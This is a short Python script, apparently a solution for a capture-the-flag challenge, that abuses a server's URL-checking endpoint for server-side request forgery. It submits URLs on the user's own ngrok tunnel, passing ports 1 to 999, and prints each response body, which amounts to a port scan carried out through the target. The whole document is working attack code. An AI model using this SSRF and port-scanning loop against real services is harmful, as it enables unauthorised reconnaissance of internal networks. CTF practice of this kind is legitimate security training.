import requests

url = "http://challenges.hackday.fr:43244/api/check"
# Replace <REDACTED> with your URL
test_url = "https://<REDACTED>.ngrok-free.app/?port="

for i in range(1, 1000):
    # Replace <REDACTED> with your URL
    test_url = f"https://<REDACTED>.ngrok-free.app/?port={i}"
    response = requests.post(url, data={"url": test_url, "showBody": "on"})
    print(f"Testing port {i}:\n{response.text}\n")